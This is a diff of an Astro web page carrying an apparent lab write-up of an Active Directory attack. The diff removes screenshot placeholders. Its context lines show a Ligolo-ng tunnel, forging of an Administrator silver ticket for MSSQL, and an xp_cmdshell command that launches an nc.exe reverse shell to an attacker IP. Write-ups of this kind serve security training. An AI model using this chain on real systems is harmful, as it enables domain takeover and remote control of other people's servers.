@@ -108,11 +108,6 @@ import Layout from '../../layouts/Layout.astro';
 Info: Establishing connection to remote endpoint</span></pre>
       </div>
 
-      <figure>
-        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · evil-winrm session established</span></div>
-        <figcaption><span class="fig-lbl">FIG 01</span><span class="fig-alt">WinRM session as john.smith on 10.10.10.20 — low-privileged foothold.</span></figcaption>
-      </figure>
-
       <h3 id="reaching-1433">Reaching Port 1433</h3>
       <p>Confirm port 1433 is listening locally on the target:</p>
 
@@ -155,11 +150,6 @@ Info: Establishing connection to remote endpoint</span></pre>
       </div>
 
       <p>These commands create the network interface and start the Ligolo proxy, which will listen for the agent connection.</p>
-
-      <figure>
-        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · ligolo-proxy listening, waiting for agent</span></div>
-        <figcaption><span class="fig-lbl">FIG 02</span><span class="fig-alt">ligolo-proxy started with self-signed cert, listening on :11601.</span></figcaption>
-      </figure>
 
       <p>Host the agent binary with a Python HTTP server, then download and execute it from the WinRM session:</p>
 
@@ -208,11 +198,6 @@ ligolo-ng »</span> <span class="cmd">session</span>
 ligolo-ng »</span> <span class="cmd">start</span></pre>
       </div>
 
-      <figure>
-        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · agent connection received in ligolo console</span></div>
-        <figcaption><span class="fig-lbl">FIG 03</span><span class="fig-alt">Agent joined confirmation and session started in the Ligolo-ng proxy console.</span></figcaption>
-      </figure>
-
       <p>Add a route for the magic CIDR — <code>240.0.0.1</code> maps to the loopback of the target machine:</p>
 
       <div class="cb" data-host="attacker">
@@ -224,11 +209,6 @@ ligolo-ng »</span> <span class="cmd">start</span></pre>
         <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
 └─$</span> <span class="cmd">sudo ip route add</span> <span class="num">240.0.0.1/32</span> <span class="flag">dev</span> <span class="arg">ligolo</span></pre>
       </div>
-
-      <figure>
-        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · ping 240.0.0.1 showing loopback is reachable</span></div>
-        <figcaption><span class="fig-lbl">FIG 04</span><span class="fig-alt">Pinging 240.0.0.1 succeeds — loopback services on the target are now reachable from the attacker machine.</span></figcaption>
-      </figure>
 
       <h3 id="access-1433">Access Port 1433 (MSSQL)</h3>
       <p>With the tunnel active, connect to MSSQL through the magic CIDR using the <code>svc_mssql</code> credentials:</p>
@@ -247,11 +227,6 @@ ligolo-ng »</span> <span class="cmd">start</span></pre>
 [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
 [*] INFO(srv01\SQLEXPRESS): Line 1: Changed database context to 'master'.</span></pre>
       </div>
-
-      <figure>
-        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · mssqlclient connected as svc_mssql</span></div>
-        <figcaption><span class="fig-lbl">FIG 05</span><span class="fig-alt">First problem solved: port 1433 is reachable through the tunnel. We can authenticate as svc_mssql — but not yet as Administrator.</span></figcaption>
-      </figure>
 
       <p>The first problem is solved: we can interact with port 1433 as <code>svc_mssql</code>. However, we still need to access it as the Administrator user in order to run commands such as <code>xp_cmdshell</code>.</p>
 
@@ -296,11 +271,6 @@ MSSQL/srv01.corp.local  svc_mssql            2023-04-30 03:45:33.288595   2024-0
 [*] Domain SID is: S-1-5-21-1111111111-2222222222-3333333333</span></pre>
       </div>
 
-      <figure>
-        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · lookupsid output showing domain SID</span></div>
-        <figcaption><span class="fig-lbl">FIG 06</span><span class="fig-alt">Domain SID retrieved via the Ligolo tunnel using svc_mssql credentials.</span></figcaption>
-      </figure>
-
       <h3 id="hosts">Edit <code>/etc/hosts</code></h3>
       <p>Replace the current IP with <code>240.0.0.1</code> and add the KDC hostname (<code>srv01.corp.local</code>) obtained from <code>GetUserSPNs</code>.</p>
 
@@ -332,11 +302,6 @@ MSSQL/srv01.corp.local  svc_mssql            2023-04-30 03:45:33.288595   2024-0
 <span class="prm">└─$</span> <span class="cmd">echo</span> <span class="var">$NT</span>
 <span class="out">ab4f5a5c42df5a0ee337d12ce77332f5</span></pre>
       </div>
-
-      <figure>
-        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · NT hash derivation from plaintext password</span></div>
-        <figcaption><span class="fig-lbl">FIG 07</span><span class="fig-alt">NTLM hash computed offline from the cracked svc_mssql password using openssl MD4.</span></figcaption>
-      </figure>
 
       <h3 id="ticketer">Acquiring the Ticket for the Administrator User</h3>
 
@@ -371,11 +336,6 @@ MSSQL/srv01.corp.local  svc_mssql            2023-04-30 03:45:33.288595   2024-0
       <blockquote>
         <p>The SPN, domain SID, and NT hash were all acquired by the previous commands. Because we are forging with <code>-nthash</code>, the ticket is RC4-encrypted; if the service enforced AES, we would need <code>-aesKey</code> instead.</p>
       </blockquote>
-
-      <figure>
-        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · ticketer output, Administrator.ccache created</span></div>
-        <figcaption><span class="fig-lbl">FIG 08</span><span class="fig-alt">Silver ticket forged successfully — Administrator.ccache written to the current directory.</span></figcaption>
-      </figure>
 
       <div class="cb" data-host="attacker">
         <div class="cb-head">
@@ -428,11 +388,6 @@ SMB  240.0.0.1  445  SRV01  [+] Run: export KRB5_CONFIG=krb5.conf</span>
     corp.local = CORP.LOCAL</span></pre>
       </div>
 
-      <figure>
-        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · krb5.conf content showing realm config</span></div>
-        <figcaption><span class="fig-lbl">FIG 09</span><span class="fig-alt">Generated krb5.conf mapping CORP.LOCAL realm to the KDC at srv01.corp.local (which resolves to 240.0.0.1 via /etc/hosts).</span></figcaption>
-      </figure>
-
       <h3 id="klist">Checking That the Ticket Is in Memory</h3>
 
       <div class="cb" data-host="attacker">
@@ -450,11 +405,6 @@ Valid starting       Expires              Service principal
 05/14/2026 09:45:39  05/11/2036 09:45:39  MSSQL/srv01.corp.local@CORP.LOCAL
         renew until 05/11/2036 09:45:39</span></pre>
       </div>
-
-      <figure>
-        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · klist showing Administrator ticket loaded</span></div>
-        <figcaption><span class="fig-lbl">FIG 10</span><span class="fig-alt">Ticket is loaded and ready — valid for MSSQL/srv01.corp.local@CORP.LOCAL as Administrator.</span></figcaption>
-      </figure>
 
       <!-- ======================================================= -->
       <h2 id="shell"><span class="num">05.</span> Getting a Shell</h2>
@@ -508,11 +458,6 @@ SQL (CORP\Administrator  dbo@master)&gt;</span></pre>
         </div>
         <pre><span class="prm">SQL (CORP\Administrator  dbo@master)&gt;</span> <span class="kw">xp_cmdshell</span> <span class="str">"C:\temp\nc.exe 10.10.14.5 4445 -e cmd"</span></pre>
       </div>
-
-      <figure>
-        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · xp_cmdshell executing nc.exe reverse shell</span></div>
-        <figcaption><span class="fig-lbl">FIG 11</span><span class="fig-alt">nc.exe launched via xp_cmdshell, dialing back to attacker on port 4445.</span></figcaption>
-      </figure>
 
       <h3 id="new-session">Creating a New Session</h3>
 
